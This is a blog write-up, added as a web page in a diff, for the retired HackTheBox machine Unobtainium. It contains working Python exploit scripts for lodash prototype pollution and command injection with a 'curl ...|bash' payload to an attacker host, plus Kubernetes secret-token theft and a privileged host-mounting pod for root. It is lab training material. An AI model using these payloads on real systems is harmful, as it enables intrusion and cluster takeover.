@@ -1,0 +1,1487 @@
+<!DOCTYPE html><html lang="en-us" >
+
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  
+  
+  
+    <meta name="generator" content="Wowchemy 5.0.0-beta.3 for Hugo" />
+  
+
+  
+
+  
+  
+
+  
+  
+  
+  
+  
+    
+    
+    
+  
+  
+
+  <meta name="author" content="Mohamed Elleuch" />
+
+  
+  
+  
+    
+  
+  <meta name="description" content="Here&#39;s my writeup for the RETIRED machine Unobtainium, Which is a hard Linux machine!" />
+
+  
+  <link rel="alternate" hreflang="en-us" href="https://mohamed-elleuch.me/writeups/htb-unobtainium/" />
+
+  
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  
+
+  
+  
+  
+    <meta name="theme-color" content="#1565c0" />
+  
+
+  
+  
+
+  
+  
+  
+  
+    
+    
+      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.0/css/academicons.min.css" integrity="sha512-W4yqoT1+8NLkinBLBZko+dFB2ZbHsYLDdr50VElllRcNt2Q4/GSs6u71UHKxB7S6JEMCp5Ve4xjh3eGQl/HRvg==" crossorigin="anonymous">
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.14.0/css/all.min.css" integrity="sha256-FMvZuGapsJLjouA6k7Eo2lusoAX9i0ShlWFG6qt7SLc=" crossorigin="anonymous">
+
+    
+    
+
+    
+    
+    
+      
+    
+    
+      
+      
+        
+          <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.2.0/styles/github.min.css" crossorigin="anonymous" title="hl-light" media="print" onload="this.media='all'">
+          <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.2.0/styles/dracula.min.css" crossorigin="anonymous" title="hl-dark" media="print" onload="this.media='all'" disabled>
+        
+      
+    
+
+    
+    
+    
+      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.7.1/leaflet.min.css" integrity="sha512-1xoFisiGdy9nvho8EgXuXvnpR5GAMSjFwp40gSRE3NwdUdIMIKuPa7bqoUhLD0O/5tPNhteAsE5XyyMi5reQVA==" crossorigin="anonymous" media="print" onload="this.media='all'">
+    
+
+    
+
+    
+    
+      
+      
+
+      
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/lazysizes/5.2.2/lazysizes.min.js" integrity="sha512-TmDwFLhg3UA4ZG0Eb4MIyT1O1Mb+Oww5kFG0uHqXsdbyZz9DcvYQhKpGgNkamAI6h2lGGZq2X8ftOJvF/XjTUg==" crossorigin="anonymous" async></script>
+      
+    
+      
+      
+
+      
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+    
+      
+      
+
+      
+      
+        
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+    
+  
+
+  
+  
+  
+    
+      
+      <link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&family=Roboto+Mono&family=Roboto:wght@400;700&display=swap">
+      <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&family=Roboto+Mono&family=Roboto:wght@400;700&display=swap" media="print" onload="this.media='all'">
+    
+  
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="/css/wowchemy.8028d170b3ecf9438246932e1cbcdf6c.css" />
+
+  
+
+
+
+  
+
+  
+
+
+  
+  
+  
+
+  
+
+  
+    <link rel="manifest" href="/index.webmanifest" />
+  
+
+  <link rel="icon" type="image/png" href="/images/icon_hu69b6a0d933f031dfe27449e0ead5af37_9293_32x32_fill_lanczos_center_2.png" />
+  <link rel="apple-touch-icon" type="image/png" href="/images/icon_hu69b6a0d933f031dfe27449e0ead5af37_9293_180x180_fill_lanczos_center_2.png" />
+
+  <link rel="canonical" href="https://mohamed-elleuch.me/writeups/htb-unobtainium/" />
+
+  
+  
+  
+  
+  
+  
+  
+    
+  
+  
+  <meta property="twitter:card" content="summary_large_image" />
+  
+  <meta property="og:site_name" content="Mohamed ELLEUCH" />
+  <meta property="og:url" content="https://mohamed-elleuch.me/writeups/htb-unobtainium/" />
+  <meta property="og:title" content="HackTheBox - Unobtainium Writeup | Mohamed ELLEUCH" />
+  <meta property="og:description" content="Here&#39;s my writeup for the RETIRED machine Unobtainium, Which is a hard Linux machine!" /><meta property="og:image" content="https://mohamed-elleuch.me/writeups/htb-unobtainium/featured.png" />
+    <meta property="twitter:image" content="https://mohamed-elleuch.me/writeups/htb-unobtainium/featured.png" /><meta property="og:locale" content="en-us" />
+  
+    
+      <meta
+        property="article:published_time"
+        content="2021-09-04T00:00:00&#43;00:00"
+      />
+    
+    <meta property="article:modified_time" content="2021-09-04T00:00:00&#43;00:00">
+  
+
+  
+
+
+
+  
+
+  
+
+  
+
+
+
+
+
+  <title>HackTheBox - Unobtainium Writeup | Mohamed ELLEUCH</title>
+</head>
+
+
+<body id="top" data-spy="scroll" data-offset="70" data-target="#TableOfContents" class="page-wrapper  ">
+
+  
+  
+  
+  
+  
+  
+  
+  
+  <script src="/js/wowchemy-init.min.76abe0ff166961e9adc403995f18189f.js"></script>
+
+  
+
+
+<aside class="search-modal" id="search">
+  <div class="container">
+    <section class="search-header">
+
+      <div class="row no-gutters justify-content-between mb-3">
+        <div class="col-6">
+          <h1>Search</h1>
+        </div>
+        <div class="col-6 col-search-close">
+          <a class="js-search" href="#" aria-label="Close"><i class="fas fa-times-circle text-muted" aria-hidden="true"></i></a>
+        </div>
+      </div>
+
+      <div id="search-box">
+        
+        <input name="q" id="search-query" placeholder="Search..." autocapitalize="off"
+        autocomplete="off" autocorrect="off" spellcheck="false" type="search" class="form-control"
+        aria-label="Search...">
+        
+      </div>
+
+      
+      
+
+      
+
+    </section>
+    <section class="section-search-results">
+
+      <div id="search-hits">
+        
+      </div>
+
+    </section>
+  </div>
+</aside>
+
+
+
+  <div class="page-header">
+    
+
+
+
+
+
+
+
+
+
+
+
+
+<nav class="navbar navbar-expand-lg navbar-light compensate-for-scrollbar" id="navbar-main">
+  <div class="container-xl">
+
+    
+    <div class="d-none d-lg-inline-flex">
+      <a class="navbar-brand" href="/">Mohamed ELLEUCH</a>
+    </div>
+    
+
+    
+    <button type="button" class="navbar-toggler" data-toggle="collapse"
+            data-target="#navbar-content" aria-controls="navbar" aria-expanded="false" aria-label="Toggle navigation">
+    <span><i class="fas fa-bars"></i></span>
+    </button>
+    
+
+    
+    <div class="navbar-brand-mobile-wrapper d-inline-flex d-lg-none">
+      <a class="navbar-brand" href="/">Mohamed ELLEUCH</a>
+    </div>
+    
+
+    
+    
+    <div class="navbar-collapse main-menu-item collapse justify-content-start" id="navbar-content">
+
+      
+      <ul class="navbar-nav d-md-inline-flex">
+        
+
+        
+
+        
+        
+        
+          
+        
+
+        
+
+        
+        
+        
+        
+
+        
+          
+            
+            
+          
+          
+            
+            
+            
+              
+            
+            
+          
+        
+
+        <li class="nav-item">
+          <a class="nav-link " href="/#about"><span>Home</span></a>
+        </li>
+
+        
+        
+
+        
+
+        
+        
+        
+          
+        
+
+        
+
+        
+        
+        
+        
+
+        
+          
+            
+            
+          
+          
+            
+            
+            
+              
+            
+            
+          
+        
+
+        <li class="nav-item">
+          <a class="nav-link " href="/#posts"><span>Writeups</span></a>
+        </li>
+
+        
+        
+
+        
+
+        
+        
+        
+          
+        
+
+        
+
+        
+        
+        
+        
+
+        
+          
+            
+            
+          
+          
+            
+            
+            
+              
+            
+            
+          
+        
+
+        <li class="nav-item">
+          <a class="nav-link " href="/#contact"><span>Contact</span></a>
+        </li>
+
+        
+        
+
+      
+
+        
+      </ul>
+    </div>
+
+    <ul class="nav-icons navbar-nav flex-row ml-auto d-flex pl-md-2">
+
+      
+      
+        
+      
+
+      
+      
+      <li class="nav-item">
+        <a class="nav-link js-search" href="#" aria-label="Search"><i class="fas fa-search" aria-hidden="true"></i></a>
+      </li>
+      
+
+      
+      
+      <li class="nav-item dropdown theme-dropdown">
+        <a href="#" class="nav-link" data-toggle="dropdown" aria-haspopup="true" aria-label="Display preferences">
+          <i class="fas fa-moon" aria-hidden="true"></i>
+        </a>
+        <div class="dropdown-menu">
+          <a href="#" class="dropdown-item js-set-theme-light">
+            <span>Light</span>
+          </a>
+          <a href="#" class="dropdown-item js-set-theme-dark">
+            <span>Dark</span>
+          </a>
+          <a href="#" class="dropdown-item js-set-theme-auto">
+            <span>Automatic</span>
+          </a>
+        </div>
+      </li>
+      
+
+      
+
+    </ul>
+
+  </div>
+</nav>
+
+
+  </div>
+
+  <div class="page-body">
+    <article class="article">
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+<div class="article-container pt-3">
+  <h1>HackTheBox - Unobtainium Writeup</h1>
+
+  
+  <p class="page-subtitle">Here&rsquo;s my writeup for the RETIRED machine Unobtainium, Which is a hard Linux machine!</p>
+  
+
+  
+
+
+<div class="article-metadata">
+
+  
+  
+  
+  
+  <div>
+    
+
+  <span class="author-highlighted">
+      Mohamed Elleuch</span>
+  </div>
+  
+  
+
+  
+  <span class="article-date">
+    
+    
+      
+    
+    Sep 4, 2021
+  </span>
+  
+
+  
+
+  
+
+  
+  
+  
+  
+  
+  
+
+  
+  
+
+</div>
+
+  
+
+
+
+
+
+</div>
+
+
+<div class="article-header container featured-image-wrapper mt-4 mb-4" style="max-width: 656px; max-height: 417px;">
+  <div style="position: relative">
+    <img src="/writeups/htb-unobtainium/featured.png" alt="" class="featured-image">
+    <span class="article-header-caption">Image credit: [<strong>HackTheBox</strong>]</span>
+  </div>
+</div>
+
+
+
+  <div class="article-container">
+
+    <div class="article-style">
+      <h1 id="p-stylecolorredinformation-gathering-p"><p style="color:RED">Information Gathering </p></h1>
+<hr>
+<h2 id="p-stylecolorgreennmap-scan-p"><p style="color:Green">Nmap scan </p></h2>
+<pre><code class="language-bash">sudo nmap -sC -sV 10.10.10.235 -v
+</code></pre>
+<pre><code>Discovered open port 80/tcp on 10.10.10.235
+Discovered open port 22/tcp on 10.10.10.235
+Discovered open port 31337/tcp on 10.10.10.235
+Discovered open port 8443/tcp on 10.10.10.235
+</code></pre>
+<h2 id="p-stylecolorgreenweb-enumeration-p"><p style="color:Green">Web Enumeration </p></h2>
+<p>Nothing really interesting except for the 3 downloadable files!</p>
+<img src="web.png">
+<p>Let&rsquo;s get the deb one!
+<img src="zip.png"></p>
+<h1 id="p-stylecolorredfoothold-p"><p style="color:RED">Foothold </p></h1>
+<p>Let&rsquo;s now extract the files inside the .deb file that we got</p>
+<pre><code>dpkg-deb -xv unobtainium_1.0.0_amd64.deb writeup
+</code></pre>
+<img src="extract.png">
+<p>Inside ./opt/unobtainium/ we can find an executable</p>
+<img src="exec.png">
+<p>We can solve this error by adding <code>unobtainium.htb</code> to our /etc/hosts file</p>
+<img src="exec1.png">
+<p>Nothing really interesting in the logs except of finding a potential username <code>felamos</code></p>
+<img src="exec2.png">
+<p>We can also Post messages, let&rsquo;s try to capture the traffic with wireshark when sending a message</p>
+<img src="wireshark.png">
+<p>We already capture some data even before sending any thing, which seems odd</p>
+<p>Let&rsquo;s check what he have</p>
+<img src="wire1.png">
+<img src="wire2.png">
+<p>Very interesting! we get creds</p>
+<pre><code>felamos:Winter2021
+</code></pre>
+<p>And also we can see that there is a potential LFI! Let&rsquo;s try to abuse it</p>
+<p>After trying few commun files <code>index.js</code> gave me something</p>
+<img src="ind.png">
+<pre><code class="language-js">var root = require(&quot;google-cloudstorage-commands&quot;);
+const express = require('express');
+const { exec } = require(&quot;child_process&quot;);     
+const bodyParser = require('body-parser');     
+const _ = require('lodash');                                                                  
+const app = express();
+var fs = require('fs');
+
+const users = [                                                                               
+  {name: 'felamos', password: 'Winter2021'},
+  {name: 'admin', password: Math.random().toString(32), canDelete: true, canUpload: true},      
+  ];
+
+let messages = [];                             
+let lastId = 1;                                
+
+function findUser(auth) {                                                                     
+  return users.find((u) =&gt;                                                                    
+    u.name === auth.name &amp;&amp;                                                                   
+    u.password === auth.password);                                                            
+    }                                    
+
+app.use(bodyParser.json());                                                                   
+
+app.get('/', (req, res) =&gt; {                   
+  res.send(messages);                                                                         
+  });                                                                                           
+
+app.put('/', (req, res) =&gt; {   
+  const user = findUser(req.body.auth || {});                                                 
+
+  if (!user) {                                 
+    res.status(403).send({ok: false, error: 'Access denied'});                                
+    return;
+  }
+
+  const message = {
+    icon: '__',
+  };
+
+  _.merge(message, req.body.message, {
+    id: lastId++,
+    timestamp: Date.now(),
+    userName: user.name,
+  });
+
+  messages.push(message);
+  res.send({ok: true});
+  });
+
+app.delete('/', (req, res) =&gt; {
+  const user = findUser(req.body.auth || {});
+
+  if (!user || !user.canDelete) {
+    res.status(403).send({ok: false, error: 'Access denied'});
+    return;
+  }
+
+  messages = messages.filter((m) =&gt; m.id !== req.body.messageId);
+  res.send({ok: true});
+  });
+app.post('/upload', (req, res) =&gt; {
+  const user = findUser(req.body.auth || {});
+  if (!user || !user.canUpload) {
+    res.status(403).send({ok: false, error: 'Access denied'});
+    return;
+  }
+
+
+  filename = req.body.filename;
+  root.upload(&quot;./&quot;,filename, true);
+  res.send({ok: true, Uploaded_File: filename});
+  });
+
+app.post('/todo', (req, res) =&gt; {
+    const user = findUser(req.body.auth || {});
+    if (!user) {
+        res.status(403).send({ok: false, error: 'Access denied'});
+        return;
+    }
+
+    filename = req.body.filename;
+        testFolder = &quot;/usr/src/app&quot;;
+        fs.readdirSync(testFolder).forEach(file =&gt; {
+                if (file.indexOf(filename) &gt; -1) {
+                        var buffer = fs.readFileSync(filename).toString();
+                        res.send({ok: true, content: buffer});
+                }
+        });
+        });
+
+app.listen(3000);
+console.log('Listening on port 3000...');
+
+</code></pre>
+<p>We can also get <code>package.json</code></p>
+<pre><code class="language-json">{
+  &quot;name&quot;: &quot;Unobtainium-Server&quot;,
+  &quot;version&quot;: &quot;1.0.0&quot;,
+  &quot;description&quot;: &quot;API Service for Electron client&quot;,
+  &quot;main&quot;: &quot;index.js&quot;,
+  &quot;scripts&quot;: {
+    &quot;start&quot;: &quot;node index.js&quot;
+  },
+  &quot;author&quot;: &quot;felamos&quot;,
+  &quot;license&quot;: &quot;ISC&quot;,
+  &quot;dependencies&quot;: {
+    &quot;body-parser&quot;: &quot;1.18.3&quot;,
+    &quot;express&quot;: &quot;4.16.4&quot;,
+    &quot;lodash&quot;: &quot;4.17.4&quot;,
+    &quot;google-cloudstorage-commands&quot;: &quot;0.0.1&quot;
+  },
+  &quot;devDependencies&quot;: {}
+  }
+</code></pre>
+<p>There is an interesting /upload endpoint, let&rsquo;s try if we can upload anything! but sadly that didn&rsquo;t work, we didn&rsquo;t have permessions</p>
+<p>After searching a bit we can find that loadsh 4.17.4 is vulnerable to Prototype Pollution</p>
+<blockquote>
+<p><a href="https://snyk.io/test/npm/lodash/4.17.4">https://snyk.io/test/npm/lodash/4.17.4</a></p>
+</blockquote>
+<p>And also google-cloudstorage-commands is vulnerable to RCE</p>
+<blockquote>
+<p><a href="https://snyk.io/vuln/SNYK-JS-GOOGLECLOUDSTORAGECOMMANDS-1050431">https://snyk.io/vuln/SNYK-JS-GOOGLECLOUDSTORAGECOMMANDS-1050431</a></p>
+</blockquote>
+<p>The next step to do now is pretty straightforward after knowing these 2 exploits!</p>
+<p>The /upload endpoint is what we&rsquo;ll be looking for now! It will be enough to get us into the machine</p>
+<pre><code class="language-js">
+app.post('/upload', (req, res) =&gt; {
+  const user = findUser(req.body.auth || {});
+  if (!user || !user.canUpload) {
+    res.status(403).send({ok: false, error: 'Access denied'});
+    return;
+  }
+
+
+  filename = req.body.filename;
+  root.upload(\&quot;./\&quot;,filename, true);
+  res.send({ok: true, Uploaded_File: filename});
+  });
+</code></pre>
+<p>First we need to pollute <code>canUpload</code> and changes its value to <code>true</code>. here a little python script to do it</p>
+<pre><code class="language-python">import requests
+
+headers = {
+    'content-type': 'application/json',
+}
+
+data = '{&quot;auth&quot;: {&quot;name&quot;: &quot;felamos&quot;, &quot;password&quot;: &quot;Winter2021&quot;}, &quot;message&quot;: {&quot;__proto__&quot;:{canUpload&quot;:true}}}'
+
+response = requests.put('http://unobtainium.htb:31337/', headers=headers, data=data)
+print(response.text)
+</code></pre>
+<img src="pollute.png">
+Looks like it worked!!
+<p>Now all we need to do is upload a filename which is our payload!</p>
+<pre><code>filename=&quot;&amp; PAYLOAD&quot;
+</code></pre>
+<img src="rce.png">
+<p>Here&rsquo;s a python script to do it</p>
+<pre><code class="language-python">import requests
+
+headers = {
+    'Host': 'unobtainium.htb:31337',
+    'Connection': 'keep-alive',
+    'Content-Length': '90',
+    'Accept': 'application/json, text/javascript, */*; q=0.01',
+    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) unobtainium/1.0.0 Chrome/87.0.4280.141 Electron/11.2.0 Safari/537.36',
+    'Content-Type': 'application/json',
+    'Accept-Encoding': 'gzip, deflate',
+    'Accept-Language': 'en-US',
+}
+
+data = '{\\&quot;auth\\&quot;:{\\&quot;name\\&quot;:\\&quot;felamos\\&quot;,\\&quot;password\\&quot;:\\&quot;Winter2021\\&quot;},\\&quot;filename\\&quot;:\\&quot;&amp; curl 10.10.14.37:8000/x|bash\\&quot;}'
+
+response = requests.post('http://unobtainium.htb:31337/upload', headers=headers, data=data, verify=False)
+
+</code></pre>
+<img src="foothold.png">
+<p>And we&rsquo;re on the box!</p>
+<h1 id="p-stylecolorredroot-privesc-p"><p style="color:RED">Root PrivEsc </p></h1>
+<p>Running linpeas we can see that we&rsquo;re in a container</p>
+<pre><code>[+] Is this a container? ........... Looks like we're in a Docker container
+</code></pre>
+<p>Also a weird crontab that&rsquo;s looking for the kubectl binary on the system and deletes it</p>
+<pre><code>* * * * * find / -name kubectl -exec rm {} \;
+</code></pre>
+<blockquote>
+<p>we can eaisly bypass this by changing the name of the binary</p>
+</blockquote>
+<p>Which is  the Kubernetes CLI tool that can enumerate and run commands against kubernetes clusters!</p>
+<p>Let&rsquo;s get that binary into the box and start enumerating with it</p>
+<blockquote>
+<p>Following any kubectl cheatcheet can do the trick!</p>
+</blockquote>
+<p>Let&rsquo;s find start by getting the namespaces</p>
+<pre><code>./kc get namespaces
+</code></pre>
+<img src="ns.png">
+<p>The interesting one is dev!</p>
+<p>Let&rsquo;s now list the pods in the dev namespace</p>
+<pre><code>./kc get pods -n dev
+</code></pre>
+<img src="pods.png">
+<p>There is now an interesting feature which is describe which can give us almost all the informations we need</p>
+<pre><code>./kc describe pod/devnode-deployment-cd86fb5c-6ms8d -n dev
+</code></pre>
+<pre><code>Name:         devnode-deployment-cd86fb5c-6ms8d
+Namespace:    dev
+Priority:     0
+Node:         unobtainium/10.10.10.235
+Start Time:   Sun, 17 Jan 2021 18:16:21 +0000
+Labels:       app=devnode
+              pod-template-hash=cd86fb5c
+Annotations:  &lt;none&gt;
+Status:       Running
+IP:           172.17.0.5
+IPs:
+  IP:           172.17.0.5
+Controlled By:  ReplicaSet/devnode-deployment-cd86fb5c
+Containers:
+  devnode:
+    Container ID:   docker://27a4149a9c4cc6730f21a43124b0ac8fa67eed9a7934cab4f9d95a30d1878e38
+    Image:          localhost:5000/node_server
+    Image ID:       docker-pullable://localhost:5000/node_server@sha256:f3bfd2fc13c7377a380e018279c6e9b647082ca590600672ff787e1bb918e37c
+    Port:           3000/TCP
+    Host Port:      0/TCP
+    State:          Running
+      Started:      Fri, 03 Sep 2021 05:08:42 +0000
+    Last State:     Terminated
+      Reason:       Error
+      Exit Code:    137
+      Started:      Mon, 26 Jul 2021 15:00:22 +0000
+      Finished:     Mon, 26 Jul 2021 15:04:55 +0000
+    Ready:          True
+    Restart Count:  30
+    Environment:    &lt;none&gt;
+    Mounts:
+      /var/run/secrets/kubernetes.io/serviceaccount from default-token-rmcd6 (ro)
+Conditions:
+  Type              Status
+  Initialized       True 
+  Ready             True 
+  ContainersReady   True 
+  PodScheduled      True 
+Volumes:
+  default-token-rmcd6:
+    Type:        Secret (a volume populated by a Secret)
+    SecretName:  default-token-rmcd6
+    Optional:    false
+QoS Class:       BestEffort
+Node-Selectors:  &lt;none&gt;
+Tolerations:     node.kubernetes.io/not-ready:NoExecute op=Exists for 300s
+                 node.kubernetes.io/unreachable:NoExecute op=Exists for 300s
+Events:          &lt;none&gt;
+
+</code></pre>
+<p>Seems like the pod is running on 172.17.0.5:3000</p>
+<p>Let&rsquo;s fordward it to our box</p>
+<img src="forward.png">
+<p>Since we know that it&rsquo;s vulnerable to loadsh and we can turn it into an RCE! we&rsquo;ll be doing the same steps that we did for the foothold</p>
+<pre><code class="language-python">import requests
+
+headers = {
+    'content-type': 'application/json',
+}
+
+data = '{&quot;auth&quot;: {&quot;name&quot;: &quot;felamos&quot;, &quot;password&quot;: &quot;Winter2021&quot;}, &quot;message&quot;: {&quot;__proto__&quot;:{canUpload&quot;:true}}}'
+
+response = requests.put('http://localhost:9090/', headers=headers, data=data)
+print(response.text)
+</code></pre>
+<pre><code class="language-python">import requests
+
+headers = {
+    'Host': 'localhost:9090',
+    'Connection': 'keep-alive',
+    'Content-Length': '90',
+    'Accept': 'application/json, text/javascript, */*; q=0.01',
+    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) unobtainium/1.0.0 Chrome/87.0.4280.141 Electron/11.2.0 Safari/537.36',
+    'Content-Type': 'application/json',
+    'Accept-Encoding': 'gzip, deflate',
+    'Accept-Language': 'en-US',
+}
+
+data = '{\\&quot;auth\\&quot;:{\\&quot;name\\&quot;:\\&quot;felamos\\&quot;,\\&quot;password\\&quot;:\\&quot;Winter2021\\&quot;},\\&quot;filename\\&quot;:\\&quot;&amp; curl 10.10.14.37:8000/x|bash\\&quot;}'
+
+response = requests.post('http://localhost:9090/upload', headers=headers, data=data, verify=False,proxies={'http':'http://127.0.0.1:8080'})
+
+</code></pre>
+<img src="node.png">
+<p>and we get a shell in devnode</p>
+<p>Now let&rsquo;s try if we can list secrets of the namespace kube-system</p>
+<pre><code>./kc auth can-i list secrets -n kube-system
+</code></pre>
+<img src="secret.png">
+<p>now let&rsquo;s get them</p>
+<pre><code>./kc get secrets -n kube-system
+</code></pre>
+<pre><code>root@devnode-deployment-cd86fb5c-6ms8d:~/.euch# ./kc get secrets -n kube-system
+
+NAME                                             TYPE                                  DATA   AGE
+attachdetach-controller-token-5dkkr              kubernetes.io/service-account-token   3      230d
+bootstrap-signer-token-xl4lg                     kubernetes.io/service-account-token   3      230d
+c-admin-token-tfmp2                              kubernetes.io/service-account-token   3      229d
+certificate-controller-token-thnxw               kubernetes.io/service-account-token   3      230d
+..&lt;snip&gt;..
+</code></pre>
+<p><code>c-admin-token-tfmp2</code> is the interesting one which will give us the administrator token</p>
+<pre><code>./kc describe secrets/c-admin-token-tfmp2 -n kube-system
+</code></pre>
+<img src="token.png">
+<pre><code>eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow
+</code></pre>
+<p>Now it&rsquo;s pretty much over!</p>
+<blockquote>
+<p><a href="https://labs.bishopfox.com/tech-blog/bad-pods-kubernetes-pod-privilege-escalation">https://labs.bishopfox.com/tech-blog/bad-pods-kubernetes-pod-privilege-escalation</a></p>
+</blockquote>
+<p>The only think left to check is if we&rsquo;re able to create pods</p>
+<pre><code>./kc --token=&lt;token&gt; auth can-i create pod
+</code></pre>
+<img src="bad.png">
+<p>now we can use badpod as mentioned in the article</p>
+<p>our yaml payload</p>
+<pre><code class="language-yaml">apiVersion: v1
+kind: Pod
+metadata:
+  name: everything-allowed-exec-pod
+  labels:
+    app: pentest
+spec:
+  hostNetwork: true
+  hostPID: true
+  hostIPC: true
+  containers:
+  - name: everything-allowed-pod
+    image: localhost:5000/dev-alpine
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - mountPath: /host
+      name: noderoot
+    command: [ &quot;/bin/sh&quot;, &quot;-c&quot;, &quot;--&quot; ]
+    args: [ &quot;while true; do sleep 30; done;&quot; ]
+  #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
+  volumes:
+  - name: noderoot
+    hostPath:
+      path: /
+</code></pre>
+<p>Let&rsquo;s create the pod</p>
+<pre><code>./kc create -f root.yaml --token=eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow
+
+</code></pre>
+<p>And let&rsquo;s now get a root shell on the host</p>
